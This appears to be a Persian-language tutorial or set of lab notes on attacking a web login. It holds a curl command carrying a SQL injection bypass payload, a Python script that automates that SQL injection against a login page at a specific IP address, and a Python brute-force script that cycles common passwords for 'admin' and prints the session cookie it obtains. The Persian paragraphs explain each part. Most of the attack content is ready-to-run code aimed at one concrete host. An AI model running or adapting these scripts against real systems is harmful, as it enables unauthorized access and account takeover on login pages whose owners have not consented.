```
curl -v -X POST "http://82.115.20.217/login" -d "username=' OR '1'='1' --&password=123"
```

<p dir="rtl" align="justify">
دستور <span dir="ltr"><code>curl -v</code></span> یک ابزار قدرتمند خط فرمان برای ارسال درخواست‌های شبکه است. زمانی که از سوئیچ <span dir="ltr"><code>-v</code></span> (مخفف verbose) استفاده می‌کنید، <span dir="ltr"><code>curl</code></span> جزئیات کامل فرآیند ارتباط را نمایش می‌دهد که شامل اطلاعات ارسالی در هدر درخواست، پاسخ سرور و داده‌های دریافتی می‌شود. این قابلیت برای دیباگ و تحلیل دقیق تبادلات شبکه بسیار مفید است.
</p>
<p dir="rtl" align="justify">
سوئیچ <span dir="ltr"><code>-X POST</code></span> در دستور <span dir="ltr"><code>curl</code></span>، متد HTTP درخواست را به <span dir="ltr"><code>POST</code></span> تنظیم می‌کند. این متد معمولاً برای ارسال داده به سرور (مانند اطلاعات فرم، محتوای JSON یا XML) استفاده می‌شود، برخلاف متد <span dir="ltr"><code>GET</code></span> که عمدتاً برای دریافت داده به کار می‌رود.
</p>
<p dir="rtl" align="justify">
سوئیچ <span dir="ltr"><code>-d</code></span> در دستور <span dir="ltr"><code>curl</code></span> برای تعیین داده‌ها (data) یا بدنه (body) درخواست <span dir="ltr"><code>POST</code></span> استفاده می‌شود. این داده‌ها به طور پیش‌فرض با فرمت <span dir="ltr"><code>application/x-www-form-urlencoded</code></span> ارسال می‌شوند. در این مثال خاص، داده‌های ارسالی <span dir="ltr"><code>"username=' OR '1'='1' --&password=123"</code></span> نشان‌دهنده یک حمله تزریق SQL (SQL Injection) است که سعی در دور زدن مکانیزم‌های احراز هویت دارد.
</p>


# sql_injection.py

```python
import requests

def simple_sql_test():
    url = "http://82.115.20.217/login"
    
    # Payload that should work if SQL injection is possible
    payload = "admin' OR '1'='1' --"
    
    data = {
        "username": payload,
        "password": "anything"
    }
    
    session = requests.Session()
    
    try:
        response = session.post(url, data=data, allow_redirects=False)
        
        print(f"Status: {response.status_code}")
        print(f"Redirect: {response.headers.get('Location', 'None')}")
        
        if response.status_code == 302:
            print("Likely SQL injection successful!")
            print("Trying to access protected page...")
            
            # Try to access the main page with the session
            main_page = session.get("http://82.115.20.217/")
            print(f"Main page status: {main_page.status_code}")
            print(f"Main page length: {len(main_page.text)}")
            
        else:
            print("SQL injection may have failed")
            
    except Exception as e:
        print(f"Error: {e}")

# Run the simple test
simple_sql_test()
```

<p dir="rtl" align="justify">
این کد یک <span dir="ltr"><code>SQL injection</code></span> ساده را روی یک صفحه <span dir="ltr"><code>login</code></span> تست می‌کند. در خط اول، <span dir="ltr"><code>URL</code></span> مربوط به صفحه لاگین تعریف شده است. سپس یک <span dir="ltr"><code>payload</code></span> خاص ساخته می‌شود که از <span dir="ltr"><code>syntax</code></span> <span dir="ltr"><code>SQL</code></span> استفاده می‌کند تا شرط همیشه درست ایجاد کند. این <span dir="ltr"><code>payload</code></span> در فیلد <span dir="ltr"><code>username</code></span> قرار می‌گیرد و <span dir="ltr"><code>password</code></span> می‌تواند هر مقداری داشته باشد. با استفاده از <span dir="ltr"><code>requests.Session</code></span>، یک <span dir="ltr"><code>session</code></span> ایجاد می‌شود تا <span dir="ltr"><code>cookies</code></span> و <span dir="ltr"><code>state</code></span> درخواست‌ها حفظ شود.
</p>

<p dir="rtl" align="justify">
در بخش <span dir="ltr"><code>try</code></span>، یک <span dir="ltr"><code>POST request</code></span> به سرور ارسال می‌شود و <span dir="ltr"><code>allow_redirects=False</code></span> تنظیم می‌شود تا بتوان <span dir="ltr"><code>redirect</code></span> را بررسی کرد. اگر <span dir="ltr"><code>status code</code></span> برابر با <span dir="ltr"><code>302</code></span> باشد، نشان‌دهنده موفقیت‌آمیز بودن <span dir="ltr"><code>SQL injection</code></span> و دریافت <span dir="ltr"><code>session</code></span> معتبر است. سپس با استفاده از همان <span dir="ltr"><code>session</code></span>، یک <span dir="ltr"><code>GET request</code></span> به صفحه اصلی ارسال می‌شود تا دسترسی به <span dir="ltr"><code>protected page</code></span> تأیید شود. در صورت بروز خطا، <span dir="ltr"><code>exception</code></span> مربوطه و چاپ می‌شود.
</p>


# Brute Force

```python
import requests

target_url = "http://82.115.20.217/login"
username = "admin"
passwords = ["123456", "password", "admin123", "123", "admin", "1234", "12345"]

session = requests.Session()

for password in passwords:
    data = {"username": username, "password": password}
    
    try:
        response = session.post(target_url, data=data, allow_redirects=False)
        
        if (response.status_code == 302 or
            "location" in response.headers and response.headers["location"] == "/" or
            "Set-Cookie" in response.headers and "session" in response.headers["Set-Cookie"] or
            response.url != target_url):
            
            print(f"Password found: {password}")
            print(f"Status Code: {response.status_code}")
            print(f"Redirect URL: {response.headers.get('location', 'None')}")
            print(f"Session Cookie: {response.headers.get('Set-Cookie', 'None')}")
            break
            
        else:
            print(f"Failed: {password} (Status: {response.status_code})")
            
    except Exception as e:
        print(f" Error with {password}: {e}")

print("Testing with known working credentials...")
test_data = {"username": "admin", "password": "admin123"}
response = session.post(target_url, data=test_data, allow_redirects=True)

print(f"Final Status: {response.status_code}")
print(f"Final URL: {response.url}")
print(f"Response length: {len(response.text)} characters")
print("First 200 chars of response:")
print(response.text[:200])
```

<p dir="rtl" align="justify">
این کد یک <span dir="ltr"><code>brute-force attack</code></span> ساده را روی یک صفحه <span dir="ltr"><code>login</code></span> انجام می‌دهد. ابتدا <span dir="ltr"><code>target_url</code></span> و یک لیست از <span dir="ltr"><code>passwords</code></span> معمول تعریف شده‌اند. با استفاده از <span dir="ltr"><code>requests.Session()</code></span>، یک <span dir="ltr"><code>session object</code></span> ایجاد می‌شود تا <span dir="ltr"><code>cookies</code></span> و <span dir="ltr"><code>authentication state</code></span> بین درخواست‌ها حفظ شود. در حلقه <span dir="ltr"><code>for</code></span>، برای هر <span dir="ltr"><code>password</code></span> در لیست، یک <span dir="ltr"><code>POST request</code></span> با <span dir="ltr"><code>credentials</code></span> شامل <span dir="ltr"><code>username</code></span> ثابت ("admin") و <span dir="ltr"><code>password</code></span> متغیر ارسال می‌شود. پارامتر <span dir="ltr"><code>allow_redirects=False</code></span> تنظیم شده تا بتوان <span dir="ltr"><code>redirect behavior</code></span> را manually بررسی کرد.
</p>

<p dir="rtl" align="justify">
شرایط موفقیت شامل بررسی <span dir="ltr"><code>status code 302</code></span>، وجود <span dir="ltr"><code>header</code></span>های <span dir="ltr"><code>Location</code></span> یا <span dir="ltr"><code>Set-Cookie</code></span> خاص، و تغییر <span dir="ltr"><code>URL</code></span> است. اگر هر یک از این شرایط برقرار باشد، <span dir="ltr"><code>password</code></span> صحیح تشخیص داده می‌شود. در غیر این صورت، <span dir="ltr"><code>loop</code></span> ادامه می‌یابد. در نهایت، یک <span dir="ltr"><code>test</code></span> با <span dir="ltr"><code>credentials</code></span> شناخته شده ("admin:admin123") انجام می‌شود و <span dir="ltr"><code>response details</code></span> شامل <span dir="ltr"><code>status code</code></span>، <span dir="ltr"><code>final URL</code></span>، و بخشی از <span dir="ltr"><code>response content</code></span> نمایش داده می‌شود.
</p>

<p dir="rtl" align="justify">
این کد از <span dir="ltr"><code>error handling</code></span> با <span dir="ltr"><code>try-except block</code></span> استفاده می‌کند تا <span dir="ltr"><code>exceptions</code></span> احتمالی مانند <span dir="ltr"><code>network errors</code></span> را مدیریت کند. هر <span dir="ltr"><code>failed attempt</code></span> با <span dir="ltr"><code>status code</code></span> مربوطه لاگ می‌شود، در حالی که <span dir="ltr"><code>successful attempt</code></span> باعث توقف <span dir="ltr"><code>loop</code></span> و نمایش اطلاعات <span dir="ltr"><code>session</code></span> می‌شود. این رویکرد برای تست <span dir="ltr"><code>authentication mechanisms</code></span> و شناسایی <span dir="ltr"><code>weak passwords</code></span> مفید است.
</p>
